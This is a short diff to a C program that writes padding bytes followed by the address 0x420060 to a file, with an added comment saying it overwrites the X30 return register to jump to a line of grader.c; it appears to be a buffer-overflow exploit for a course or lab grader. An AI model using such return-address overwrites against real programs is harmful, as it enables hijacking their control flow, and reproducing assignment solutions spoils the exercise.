@@ -53,9 +53,10 @@ int main(void) {
         fprintf(psFile, "%c", 'a');
     }
 
+    /* overwrite X30 with address to line 47 of grader.c */
     ulAddress = 0x420060;
-
     fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
+    
     fclose(psFile);
     return 0;
 }
